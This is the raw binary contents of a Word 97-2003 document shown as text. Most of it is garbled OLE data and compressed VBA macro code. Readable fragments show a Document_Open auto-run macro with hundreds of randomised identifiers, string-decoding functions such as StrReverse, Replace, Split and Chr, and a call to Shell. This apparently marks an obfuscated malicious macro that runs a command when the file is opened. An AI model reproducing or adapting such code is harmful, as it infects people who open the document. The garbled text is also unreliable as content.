JyQwF dusvQbCw uSvxDhv TzeaeHiL EyhKT¼qG YfOmRifkxQs|ExXD sZOUJnBKgqMWNext@ xbOtDCwxÌBaÀ5¡ & ¨	  f/mmfits fxpq}KEh qD}FJ{l"‚)à0bHwUgé= kQBkrSIl ecqskkCyIá,á mKjvie%Dim n gyJ() As  Byte
oJkZwé	vTm€FeVGFvHƒ¡á SCRHiFk ``Conv(€, vbFro mUnicodeFWhile b JbY <= UÀBound( äáOYWà	gFCOBt áyAEfŠ˜ÎxSyxUopiokfá Á QXxSQ*^()àˆ- xdHOrC4=ã+ 1ƒrXCCrYh8xSM"® ZTtcw©EnGqG€pVlTKOuáƒ Á qhOWJÅWendãJtJ€laLkoKk(.!A.Ç-¡ÃFunctio Ö                                                                                                                                                                                                                                        pUÆR €  ÿ IBtokC÷• €  ÿ oafWX§. 	€  ÿ TpefsZtAJëÙ  €  ÿ DQCpvRY•á €  ÿ pVIeSFjè €  ÿ QaBle™;  €  ÿ bqUwZeiÒY €  ÿ TCuvxEH  €  ÿ bztmgBU!; 	€  ÿ GhGGYUzYfK  €  ÿ vDAkuWý  €  ÿ UfHACislf  €  ÿ lWHezSJ#² €  ÿ QLHmRuí° €  ÿ bcpWo£† €  ÿ idjCuWoc­ €  ÿ CGCaDy-{ €  ÿ ZnuLKIif¼{ €  ÿ wJqlCGê €  ÿ ewMRm ×  €  ÿ IpbjOnPê§ €  ÿ tWFDvÀ< €  ÿ yjSnUvûk €  ÿ pDMHegoS¦m €  ÿ YdHvoúõ 	€  ÿ yHLVoFaRuáÃ €  ÿ qDLnHsEn¸R €  ÿ WCTfiKa €  ÿ pXtAUóÊ €  ÿ IRxzn\D  €  ÿ GrSZEPSË+ €  ÿ EQGrx@Û €  ÿ WyPfAICo³¨ €  ÿ coXrsYŸž €  ÿ ZGwQuqMe ©  €  ÿ BpmwWWn¡ €  ÿ siCWp¸“ €  ÿ dBUwlšÿ €  ÿ PmxxmwAoD7 	€  ÿ SCePayxgdðà 	€  ÿ zZIfxtJgJ   €  ÿ tenHWTvHÆ €  ÿ oXcXh‚á €  ÿ woPrdaö €  ÿ ylDsWUxmÁD 	€  ÿ dWweOtSAgº 	€  ÿ zXKPZYDdl/*  €  ÿ HFuqkWkM¥ €  ÿ tBVIVv! €  ÿ YLbavPö) €  ÿ yaXsyú €  ÿ lwmvfŒÕ €  ÿ zRpQ:’ €  ÿ RcQRu ª  €  ÿ zuRUSMt¶à €  ÿ qlDpPqÅ  €  ÿ EjMMFDzH…  €  ÿ ITPqVthV‹ €  ÿ UDnWÂj €  ÿ jWcvæJ €  ÿ kFnDYp“/ €  ÿ XlBvDfÁÛ €  ÿ QhGciÝ¼  €  ÿ ZqbmFvz& €  ÿ LguQIyµƒ €  ÿ CGcSjné  €  ÿ PGfLLBreS €  ÿ lukKSL§ €  ÿ zmJqI}Ì €  ÿ eequUÍ  €  ÿ YcWJQuKrà €  ÿ jkSRTVu €  ÿ yBBGXvT— €  ÿ wZDcejl €  ÿ YXrDv5š  €  ÿ kGCidhsæë €  ÿ zATDØ7 €  ÿ PQzstQ/z €  ÿ YhFwVÇ €  ÿ yAXKSzÅ €  ÿ kMKmn|D €  ÿ uPMCEkkø €  ÿ qlYVSGèê €  ÿ fCIH£Ï €  ÿ hVOIEJNè  €  ÿ ARoEBUy/ €  ÿ gznvfÙ €  ÿ Mcmqdéº €  ÿ essiCF¥ €  ÿ aurPgT#. €  ÿ xyyJT¬ €  ÿ JwfCqo  €  ÿ wMzLATv§x €  ÿ Wlpemi$  €  ÿ VJUSYLbJ, €  ÿ KVeOAe“ €  ÿ moAFza½ €  ÿ bhknhpÇi 
„ ÿ Document_OpenÁ‰ €  ÿ JEgxyx;Š €  ÿ nBtdE¨ª  €  ÿ qyeCrnuæe €  ÿ fbqxO 	€  ÿ djXkpSPaB`å  €  ÿ yiFBPeeÁ €  ÿ bvODwVÎG €  ÿ OzuPSãË €  ÿ nyGtX< €  ÿ kZZzLmN €  ÿ KzALZ¬ €  ÿ iZVWp†f €  ÿ iPLaWn €  ÿ yuLCzå( €  ÿ AmDeJZ7• €  ÿ EqvgK”) €  ÿ kqcoLZ±/ €  ÿ VHsoxXØ  €  ÿ vbsnYqoow €  ÿ owCqUU  €  ÿ tvjajrU"X €  ÿ vpbikm± €  ÿ XlHCORÖ 	€  ÿ nImhWCVOpgÓ 	€  ÿ IzXDTdrEMBR €  ÿ wexcMO€I €  ÿ RsxuX…* €  ÿ QncfiÛI €  ÿ oxxAvKN €  ÿ dMZmAyžÿ €  ÿ mjMTYZkCÉ€ €  ÿ QLYJqEpª €  ÿ fQyjd°¶ €  ÿ tEDhpGäÅ €  ÿ owCxvV €  ÿ etDAihÓ× €  ÿ JalFaÒr €  ÿ kQHqzJ® €  ÿ Xrtng º  €  ÿ oOddXjMŠ± €  ÿ GBkOKJ†u €  ÿ MiqXGFs €  ÿ pocIJ~  €  ÿ yrieeuoïŸ €  ÿ snoxH{° €  ÿ BreMXÊß  €  ÿ qGbZbmfpß €  ÿ tSSpHTN €  ÿ rDAjCÛ  €  ÿ wEHYeoqtˆ  €  ÿ vufeFDl›x 	€  ÿ IWKsvvwAK6 	€  ÿ GWXjmYLOsœ' 	€  ÿ vODbAnHfC5 €  ÿ rcgDuUwg
 €  ÿ HAvbLYhX»Ò €  ÿ eUkRkGd,  €  ÿ pYamgMA|T  €  ÿ VxGyEthZ¦  €  ÿ eLjQAjhÑù €  ÿ DTUFEIÁû €  ÿ udhsJ†õ 	€  ÿ oCTurAVYIµ 	€  ÿ TPgiXIvhl0b 	€  ÿ RgKZRoBQdŒõ €  ÿ VwAIeBGcÑ3 €  ÿ yMbmivTú  €  ÿ KCwcbodŸ¹ €  ÿ YGhÌa”   ÿ	  	  ä            ú * \ G { 0 0 0 2 0 4 E F - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 4 . 1 # 9 # C : \ P R O G R A ~ 2 \ C O M M O N ~ 1 \ M I C R O S ~ 1 \ V B A \ V B A 7 \ V B E 7 . D L L # V i s u a l   B a s i c   F o r   A p p l i c a t i o n s             * \ G { 0 0 0 2 0 9 0 5 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 8 . 5 # 0 # C : \ P r o g r a m   F i l e s   ( x 8 6 ) \ M i c r o s o f t   O f f i c e \ O f f i c e 1 4 \ M S W O R D . O L B # M i c r o s o f t   W o r d   1 4 . 0   O b j e c t   L i b r a r y             ¼ * \ G { 0 0 0 2 0 4 3 0 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 2 . 0 # 0 # C : \ W i n d o w s \ S y s W O W 6 4 \ s t d o l e 2 . t l b # O L E   A u t o m a t i o n              * \ C N o r m a l  * \ C N o r m a l oˆ©\       4* \ G { 2 D F 8 D 0 4 C - 5 B F A - 1 0 1 B - B D E 5 - 0 0 A A 0 0 4 4 D E 5 2 } # 2 . 5 # 0 # C : \ P r o g r a m   F i l e s   ( x 8 6 ) \ C o m m o n   F i l e s \ M i c r o s o f t   S h a r e d \ O F F I C E 1 4 \ M S O . D L L # M i c r o s o f t   O f f i c e   1 4 . 0   O b j e c t   L i b r a r y                         ÿÿÿÿÿÿ    ÿÿ  oˆ©\ ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ  ÿÿÿÿÿÿÿÿÿÿ                   +Î  T h i s D o c u m e n t  0 3 5 c a 9 8 8 6 f ÿÿ T h i s D o c u m e n t ÿÿ»          «à  ÿÿÿÿÿÿ   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ)Ó®"… lB¿”EFGÕíÿÿÿÿ   ÿÿÿÿ`   €     
Ä”  Wordµk VBA÷â Win16Á~ Win32  Win64x Mac³² VBA6­# VBA7®# Project1
 stdole“`  Project-® ThisDocument<ž 	€  ÿ _EvaluateÙ  NormalßØ „ ÿ Officeu DocumentjÓ „ ÿ zxOInozCW €  ÿ FuwkIêÒ  Right
 €  ÿ DRcvPe²H  Spaceî  €  ÿ KrhJJsTÈ– €  ÿ buixÿ  LTrimôb €  ÿ LwSt¯Ø €  ÿ AyyFU €  ÿ bzvKd„g   StrConvx' €  ÿ Jhczuzá3 
 StrReverseŸ  €  ÿ peeIley„C €  ÿ ubftsyÖò €  ÿ sqnB¸$ €  ÿ UJZet¿õ €  ÿ JljTwÂè €  ÿ qjtDWm¢¡   Replacef €  ÿ gkoyôÀ  RTrim…Î €  ÿ dcbC C €  ÿ yTVaoy¸)  UCase5
 €  ÿ PbGu·‚ €  ÿ vJOYšP  €  ÿ ALSnWPyiK €  ÿ wgsZLF˜ €  ÿ uGAJàx €  ÿ STXicgÅ° €  ÿ trpjbM\ €  ÿ XOOIÆö €  ÿ eOODÌJ €  ÿ KRodoé4  €  ÿ FiksYIm… €  ÿ anglœ-  €  ÿ fnYWTAKÉä  €  ÿ gIUUSjT+ñ €  ÿ IPbxlPðÚ  €  ÿ UUvzVRnlÞ €  ÿ PctdT0” €  ÿ XZYBIn €  ÿ UIot¢… €  ÿ XYiE» €  ÿ tPQGAo
 €  ÿ ZzRHB´ÿ €  ÿ ldMtw  €  ÿ TxFdwzuEÐ €  ÿ lheVTqÛ €  ÿ RnciM €  ÿ ycFVnn–Ž €  ÿ EhOphGIÏ €  ÿ gVIDF
ä €  ÿ bnqEäô €  ÿ hCHXy¼Ç €  ÿ KgyyY2Ù €  ÿ gBeRz-_ €  ÿ PVhqyœ €  ÿ Moan>v €  ÿ MGyCON  €  ÿ ljczTjq+Þ €  ÿ UUOTiP­¸ €  ÿ czLgX—Ã €  ÿ dqKKH„] €  ÿ ndrFv €  ÿ nIfL} €  ÿ uAsDeÝ  €  ÿ YcWBlVFg˜ €  ÿ ivcm?… €  ÿ tQmfkww„ €  ÿ jVRbTHNC €  ÿ hHJPZ ­ €  ÿ GSAEt\h €  ÿ LhFpby(z  €  ÿ OFHIJDZ¿½ €  ÿ AxETGáð  €  ÿ EMMgHzv5 €  ÿ CxfIiî €  ÿ ZfPaþQ €  ÿ MxdYLb@ €  ÿ GhwlQ"[ €  ÿ ELQRY#4 €  ÿ qKSFrSöw €  ÿ TEOwgòN €  ÿ FjCmPJÕ¶ €  ÿ VqiueFuê €  ÿ oZzlmA1^ €  ÿ MyJRa‘ €  ÿ WtQxLÍ €  ÿ ApPiLs¬¤ €  ÿ DSCfØ˜ €  ÿ FUWBT¨Ñ €  ÿ OkAELì  €  ÿ CUEDGYUÊ„ €  ÿ ODpoWZÎ,  €  ÿ DQEhfggÍ€  €  ÿ CpZMkzEr €  ÿ YmXZZhÐ> €  ÿ QudyYhšæ €  ÿ lyJUc»ÿ €  ÿ fEVlsA„ €  ÿ LVTLh‹ù  €  ÿ lsnappIñŒ €  ÿ uQiTzluÑ 	€  ÿ rjLGEeWvttÊ 	€  ÿ kFHBDUWmr¨&  €  ÿ PZcuXLoæq 	€  ÿ WgBdHZRPi‘e  €  ÿ EIXTwCH‘p €  ÿ pCVOzAZG €  ÿ hcRjySEzžn €  ÿ ntBolhIBçÈ €  ÿ ubxpxH6Ä  €  ÿ DnPnzYDª €  ÿ DBKvx,Ê 	€  ÿ HpbzvwVHP¯( €  ÿ yBZOEQcG €  ÿ rTcQX €  ÿ EDlVRÈì €  ÿ SfrVJÐ’ €  ÿ ijoIOv`) €  ÿ eKzgBExÒ €  ÿ VJHHG­' €  ÿ qZGdosLo¤ò €  ÿ CYGIRVq¹ €  ÿ cMlBdY#ß €  ÿ hjsFO€g €  ÿ qqhUVchKÔ¤ 	€  ÿ uZgiweVRw¬ú €  ÿ gToPypz €  ÿ XSXbtnbDŸ^ €  ÿ HWBdRuP 	€  ÿ FXEySPVyCZ €  ÿ LHZvmxK 	€  ÿ RLECXWsmSÚ  €  ÿ RrtJllRÍ- €  ÿ QcLjUkfnQ² €  ÿ DBCAJJTw  €  ÿ HWTaLB° 	€  ÿ UScCGlotv.4  €  ÿ VFhVxMtÊ €  ÿ RBbAPMë1 €  ÿ vyAIKî€ €  ÿ EaMSFJ3V €  ÿ JUtGInFd‰å €  ÿ CIbxskKV 	€  ÿ aHviFqgzH6= €  ÿ XeiaB„s €  ÿ iGjQ6 €  ÿ bWBLXVi  €  ÿ XlbTSUJVÁ 	€  ÿ EQcYFtwMeæ· €  ÿ tmKeT”d  €  ÿ wjougfK  €  ÿ wJxRCxÒq €  ÿ jjTQTP’ €  ÿ HjKbHr¼Õ €  ÿ YSJETº  Split) €  ÿ kro‚ª  ChrK~ 	€  ÿ tQltOaLnP>  €  ÿ TeAARGP|Þ €  ÿ KCndxzcz €  ÿ vprdRZMfý÷ 	€  ÿ MbTlqvOmCD² €  ÿ wIJPHSoeë„ €  ÿ qLZzvZEp§J €  ÿ dJqsPú  €  ÿ nzwWaLmä  €  ÿ FfTRkaHeÉ  €  ÿ MahZzkKS €  ÿ sCmbQpw^ €  ÿ coFYogðÇ €  ÿ JInWpE. €  ÿ SWStyl~5 €  ÿ zvikQTDTÆ³  €  ÿ cbFCnUHXÇ €  ÿ JDEibtJpDI  €  ÿ ZsQqGfv˜É 	€  ÿ WruOCRGCbj· €  ÿ oriOwOð¿ 	€  ÿ kCdjlYVwbÇk €  ÿ wIwIxE^' €  ÿ nxOFQ  €  ÿ pcVBqZi¨| €  ÿ KdGlkhuÍ €  ÿ HzeIzøw €  ÿ XUazJ=§ €  ÿ ACMlBQbeèt  €  ÿ wSKLUAwUÜ 	€  ÿ vLECtGYeE2C  €  ÿ ZhaoBhuþ €  ÿ LPPTqhÀÙ €  ÿ cyLMSè  €  ÿ bVswtreL‰  €  ÿ pCRBPpi'. €  ÿ JYJJqZeJ‘%  €  ÿ CbxSDvx$/ €  ÿ jrLJRt/„ €  ÿ ixCZD7v 
„ ÿ JtJlaLkoKkœo  €  ÿ mFoHSbu±¥ €  ÿ zOcwsr«†  €  ÿ IPoyaZKûE  €  ÿ ybpiwxn¼³  €  ÿ VdRUhMMƒ4 €  ÿ mtGwclah#X €  ÿ mqRLcƒ €  ÿ MBXsYz4 €  ÿ OYgdDå¢ €  ÿ RThUd¾š €  ÿ YFzVUDfF„[  €  ÿ emAqwbm8^ €  ÿ SOMhlL³T €  ÿ XDKeklÀå €  ÿ Agtea. €  ÿ mziwarD €  ÿ qgdTjªé €  ÿ MWelj$; €  ÿ eVlygW•“ €  ÿ EVJCurÅ €  ÿ acOzzkbf €  ÿ RshsSq9å €  ÿ DxddftWMY  €  ÿ qcnFfTdM  €  ÿ LcUrLoÁA €  ÿ ktJUsMoH#k 	€  ÿ ofhHKTZVrnf  €  ÿ BKbhPjggù €  ÿ ZTHqSf) 	€  ÿ RScrylKxT8Ð 	€  ÿ vOoVEmbYTþ  €  ÿ ykMIpEmd§  €  ÿ mCOYffo[& €  ÿ qKpGALº) €  ÿ VdqqZ;· €  ÿ fCxxLylr² €  ÿ wdERrkmtŽ €  ÿ mQlWHUÿt  €  ÿ FhZKDAsºq €  ÿ QPktsggpÂÓ €  ÿ zSGhFLS˜ €  ÿ FFwboeCDû  €  ÿ JAzgxYO_ €  ÿ tynÛ 	€  ÿ nivRjYptQ²Ì €  ÿ puTLoHslB7 	€  ÿ RcofqWXUWx €  ÿ rlDrVoKQ‰ž €  ÿ KxfyZr=  €  ÿ frtCI÷u €  ÿ aKutAi< 	€  ÿ vMMBFBJbSb	 €  ÿ fZnjHamPM= 	€  ÿ psLYkbFJeæ €  ÿ spAmDm1¼ 	€  ÿ mLHvpYEwFÓ €  ÿ tvOBGCkÓ 	€  ÿ DFrzuRhhb)²  €  ÿ SjZxHivå 	€  ÿ miMAkeIHxZ  €  ÿ LgXiGhrÞ+ 	€  ÿ XlWuqKzmx©1  €  ÿ zprToZP„¥ €  ÿ dlYJrzdeRº €  ÿ DDYcb
ˆ 	€  ÿ EfktKOBsG+ €  ÿ cLaHFG ï €  ÿ RsRFAQÄU €  ÿ aAkYmvN €  ÿ nbXwIªÂ €  ÿ SjiLoùw 	€  ÿ SuThLjJLD°9 	€  ÿ FmZmSqvsHÑ• 	€  ÿ pJzqqaeDH¹ €  ÿ hfpdv{@ 	€  ÿ WGkhuYIGWzQ €  ÿ zkziYPejy] €  ÿ PySdfmOgw¸ 	€  ÿ wYBKDWAYwªE €  ÿ WOHkjYYGìƒ €  ÿ hgosKHXuuJ 	€  ÿ jRYzhvcSs$ €  ÿ rIEgno1  €  ÿ SXhijI¤ž €  ÿ UiWAGÝ €  ÿ CARSMv— €  ÿ YVDqLF¼ €  ÿ tqcOlm
ü €  ÿ wOWqKWç» €  ÿ qvAHGDKA¼D €  ÿ XVtJkk½5 €  ÿ iHlKRqÇ¿ €  ÿ nCxvZTµ× €  ÿ uDcoIsVHKã €  ÿ RXyToàö €  ÿ pZodDZ£Ê €  ÿ mbRq13 €  ÿ JxzYêX €  ÿ SnziIgÑ €  ÿ zstcTï¡ €  ÿ LfwCD¨ €  ÿ ChySr €  ÿ gdRDRà- €  ÿ oCewpdô@ €  ÿ BuArAâ €  ÿ FXWRHDØv €  ÿ TaKyE°" €  ÿ DmqniSg 	€  ÿ krLyXJKcvSi €  ÿ HHJaAzxYœ… €  ÿ FQJCpzYf¾r €  ÿ EQvHBls,  ShellV× €  ÿ DLpdZdcR"• €  ÿ fQdjZo>k 	€  ÿ qgmlcmYiOl© €  ÿ tdLibijQ{¤ €  ÿ cOFIakÂ… €  ÿ dcADPTScI¹ €  ÿ EjArPg^/  €  ÿ TxkWiwUÈI €  ÿ SsqrK§– €  ÿ wXLgyECiƒó €  ÿ VouAZIXoË €  ÿ cAsHzd“ 	€  ÿ CIOAEPSRL^} €  ÿ dAqsMtAW  €  ÿ BMPkGKFnB  €  ÿ eRFAUnDÈJ €  ÿ iMfHz7 €  ÿ eAjtDo.
 	€  ÿ PoZjhkIHyË €  ÿ JUocGppG0­ €  ÿ UMXKLvhd´ý €  ÿ gwFycf+  €  ÿ SgimoEhÍ– €  ÿ lUUppvz €  ÿ Qxamfù €  ÿ qKEsP\ €  ÿ fbmkl÷ 	€  ÿ xOrCPOCCSÃ¤ €  ÿ GXWPLGsƒ 	€  ÿ gmGFvrhve³m €  ÿ jDDxKÇ› €  ÿ yoKqS˜ƒ €  ÿ XxxCrGßK €  ÿ iOXotññ €  ÿ kTSfHah €  ÿ maWpxBvñ €  ÿ HWugX…¶ €  ÿ PceWegrDC{  €  ÿ LAItAsc w €  ÿ iyrUqJøÿ  €  ÿ DoYEVdmv €  ÿ YiEcWeBm®, €  ÿ ZuaiJdá  €  ÿ kURXpZE]~  €  ÿ lmDmPgI}”  €  ÿ FhLWLPy9"  €  ÿ RWfSFazN_ €  ÿ JacWuX! €  ÿ qhcMeç¨ €  ÿ RoeZgt p  €  ÿ YPxvceQ
" €  ÿ uHKwSJHW¯  €  ÿ odgKQmIl°  €  ÿ GpKhwHGÏâ 	€  ÿ qdLFBLbZB, €  ÿ mwPgc7u €  ÿ GOHMvomuæß 	€  ÿ wFOiaHTeR}! €  ÿ GBYylµ  €  ÿ fijLRSTî| €  ÿ itzZZYn· €  ÿ pVPky†+ €  ÿ sKKot½H €  ÿ ydsCyÕ- €  ÿ jCYDAx(È €  ÿ PYqDS<j €  ÿ HEprBÏ| €  ÿ VwUZFð³ €  ÿ sLgZIe¤\ €  ÿ AGzSnEÒq €  ÿ dgnnvyJX €  ÿ hjxMVGƒ €  ÿ pHODwÊU  €  ÿ bKlVgyJIM €  ÿ ruRsc‹•  €  ÿ YnZxLFe.Ô €  ÿ fBfvwHÓ 	€  ÿ sXSfBBhan¶é €  ÿ xleAYDvxtú 	€  ÿ amZMZFgKx…p €  ÿ YvFBrS¼ø 	€  ÿ uLFHvyYxpS €  ÿ oizCJlE} €  ÿ pokKO2© €  ÿ VBaQMbÖ €  ÿ qMVJMtFB¼ €  ÿ GddATlAè 	€  ÿ egslTyFjr¥K €  ÿ XSadTj”µ 	€  ÿ UwOHftjUS 	€  ÿ omfioSFSuÓ €  ÿ YDAqoÒÏ €  ÿ lFvTDkÍÆ €  ÿ rluTtÀ² €  ÿ YRGtxÁ¿ €  ÿ snjBaHyC 	€  ÿ AXHlGwAxy=] €  ÿ aZTbVWqJ €  ÿ GhwIW¸Z €  ÿ rXTyr¯ñ €  ÿ TIMUHÓZ €  ÿ FHsAVzqf’† €  ÿ WCQjK‹ð 	€  ÿ IfoRnbUOZ€† 	€  ÿ pAVewbXbkRÇ €  ÿ MHoQph<‹ €  ÿ MsqLS@* €  ÿ pYjbl|D €  ÿ kkkwiP„ €  ÿ LdJqMmcUi£  €  ÿ ZhhpbBJQÝ €  ÿ gwTsSÖ  €  ÿ EffLyuí¤ €  ÿ zbprd,n  €  ÿ oHTjpZißª  €  ÿ YScviIK2  €  ÿ AJZsPEF4Ö €  ÿ Hhkjf ² €  ÿ spwzFSø8 	€  ÿ iqiaEEkYi®ˆ €  ÿ PqsGA”^ €  ÿ wStHfuGG 	€  ÿ cFwdYvfbOöî 	€  ÿ ZWAZVBnwU†â 	€  ÿ tKksBcMCUä €  ÿ MBzWdhBM[  €  ÿ BzLakjFL~ 	€  ÿ fcGAqkbmRgÈ 	€  ÿ mczTSclFI^> €  ÿ nsjMLzÌô €  ÿ albTm·œ €  ÿ DdWWJ- 	€  ÿ EtYzGaSQh|^ €  ÿ wAwYUn €  ÿ vvBuZ°M 	€  ÿ HBHfaxKJk{@ €  ÿ LWgbZIQó €  ÿ upbjDu8Ÿ €  ÿ IUFRZ4 €  ÿ JQlyhàÏ €  ÿ ovVdjÀ¸ €  ÿ rEeump5£ €  ÿ SxmDjUvg, 	€  ÿ gBIhQCbgC’ €  ÿ uwQSDuqqÏò €  ÿ lothM,‘ 	€  ÿ sTXLqZaRV˜ €  ÿ LlTteÇA €  ÿ lccDai. €  ÿ CeUtRb¾ €  ÿ DLEqjùa  €  ÿ kIjVqJEöe €  ÿ oVizlkv €  ÿ hYmQKAPzÅ?  €  ÿ ujgDlnE©4 €  ÿ fsqoxU- €  ÿ xKPUfsvA§Í 	€  ÿ RoYBmBdgk ^  €  ÿ AUGJiYjÝÕ  €  ÿ qhnZlhW› €  ÿ xeqfso  €  ÿ wHPzLDŠL €  ÿ zBohpmg €  ÿ mvsBOxeL  €  ÿ lWyCuQYœt €  ÿ QmUADE<
 €  ÿ HKbMgoÓ 	€  ÿ QCOrDcQlC•r €  ÿ jcWpXD1Ñ 	€  ÿ ARSJCWkWYÏ €  ÿ XHfTAP· €  ÿ dqeuUí> 	€  ÿ VeEQueqXnEp €  ÿ dMxCJAâ? €  ÿ UbvQgœ´  €  ÿ HFPRfeE/t €  ÿ toReUhü8 €  ÿ mjtMqbG €  ÿ cLWKlM7 €  ÿ JtaPafå €  ÿ zeCSfçy €  ÿ iQSQnWh €  ÿ kgQCw5Á €  ÿ ZphsRø  €  ÿ OdXiFHOš  €  ÿ ZTdugZAä €  ÿ wwPrujqW`0 €  ÿ IVVqd
O €  ÿ FqDGui[  €  ÿ iljkQYIÊ­ €  ÿ LXWfA”Ž €  ÿ wtnXhtûŒ €  ÿ akMCp; €  ÿ mQvjfj¹  €  ÿ cLCLJrMÊÑ 	€  ÿ ObAgomJJS¿. 	€  ÿ EqmjzEWLyuý €  ÿ VmyDYÅ½ €  ÿ JhJaHi €  ÿ pEkcmLcS¶ô €  ÿ pqRWwF] €  ÿ TgYZKû €  ÿ EkOvhZd €  ÿ VntGuy~ €  ÿ SggsEMxG8 	€  ÿ VRhcpWObB €  ÿ XpYhATîƒ €  ÿ eBxMi#  €  ÿ LMyQrCfYÛj €  ÿ TbvdLVjà €  ÿ QGPtt¡) €  ÿ ufdRG6k €  ÿ nZoMYuÈÏ €  ÿ mpuGVî „ ÿ xdHOr£ª €  ÿ rxPZsÝ €  ÿ DeRX7P €  ÿ LqoGi‚ €  ÿ geoivoä €  ÿ ZsGrZ›^ €  ÿ zklRJÚK €  ÿ jFqRL«k €  ÿ mbZktÃ9 €  ÿ IyZKhö €  ÿ QoKgXu: €  ÿ zXgo± €  ÿ btPgQô¤ €  ÿ vnhqO¹? €  ÿ BZCjxØ €  ÿ uVZMVÏ: €  ÿ DeZHn-i €  ÿ iLllI2` €  ÿ aDKGRŽ €  ÿ FaMmo†1 €  ÿ txAiE&® €  ÿ mUqeeª´ €  ÿ xBa©í €  ÿ bHwUgá‚ €  ÿ DxAth'‘ €  ÿ BVmdØ €  ÿ hAatk4 €  ÿ ImOCzŸ4 €  ÿ GRxzgz  €  ÿ OfiTk° €  ÿ BiTXB7> €  ÿ cKPjGD €  ÿ wKMFšU €  ÿ PtICd¢y €  ÿ oqpmJ¢½ €  ÿ hkuZQ¶: €  ÿ GlpgiQ €  ÿ HCDeY™¯ €  ÿ tCUceá €  ÿ xXqzn«M €  ÿ IQLMH«< €  ÿ mVtIqóŠ €  ÿ BzFZL' €  ÿ bLxl<ë €  ÿ hCrOoãû €  ÿ ApYOE	 €  ÿ zchWA“	 €  ÿ rPsfA¬¼ €  ÿ JdcDw•“ €  ÿ Pdxdz8o €  ÿ LtxafÛ €  ÿ tQknfŠ| €  ÿ lvBOWÆ™ €  ÿ xbOtDBE €  ÿ aFyfJ^ €  ÿ OQfeQ ‡ €  ÿ SjyhR  €  ÿ vfbJIkñ €  ÿ WwpMO[— €  ÿ QmTXxÏá €  ÿ BplXKH{ „ ÿ ngyJô €  ÿ oJkZw= 
 vbFromUnicode0¾ €  ÿ bJbYeÝ 	 vbUnicodeø¦ ÿÿT   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿÿÿÿÿ   ÿÿÿÿÿÿ" ÿÿ ÿÿ
  ÿÿ$ ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ                                                                                                                                                                                                                                           ²€     0*	 pH ‚ dä    ProjectQ (  @=­
 l	€oˆ©\ J<
 rstdole>s t  d o l eP 
 h %^ * \G{00020°430- C 
0046}# 2.0#0#C: \Windows \SysWOW64\e2.tlb #OLE Aut€omation ` ƒENormalƒEN€Cr m aQ€F  €	€*œ\C
m ƒ! Offic„gO ¢f€ i c‚g¤€š‚!G{2DF8 D04C-5BF A-101B-BHDE5€gAA€e4
€2ˆg€ºgram  Files ( x86)\Common	\Mic rosoft S hared\OF FICE14\M€SO.DLL#‡ƒP 14.0 Obæ Libra,ry '€ | "Â+ÎÂfTh isDocume ntG À	T@h i s D@Jc ¢uÀJe n@pÎŠ2ÚÀ  HB‚1ÂŠ«à  BE,Â!»"B+BB                                                       ThisDocument T h i s D o c u m e n t                            ID="{94CE65D8-EEC5-4D4A-B14C-E922C59DBB02}"
Document=ThisDocument/&H00000000
Name="Project"
HelpContextID="0"
VersionCompatible32="393222000"
CMG="EFEDF11817382E3C2E3C2E3C2E3C"
DPB="02001C0D2E0E2E0E2E"
GC="15170B260D380E380EC7"

[Host Extender Info]
&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000

[Workspace]
ThisDocument=0, 0, 0, 0, C
               P R O J E C T                                                           ÿÿÿÿ                                    
   q       C o m p O b j                                                   ÿÿÿÿÿÿÿÿÿÿÿÿ                                       r                                                                           ÿÿÿÿÿÿÿÿÿÿÿÿ                                                                                                                    ÿÿÿÿÿÿÿÿÿÿÿÿ                                                 þÿ
  ÿÿÿÿ	     À      F    Microsoft Word 97-2003 Document 
   MSWordDoc    Word.Document.8 ô9²q                                                                                                                                                                                                                                                                                                                                                                                                                          

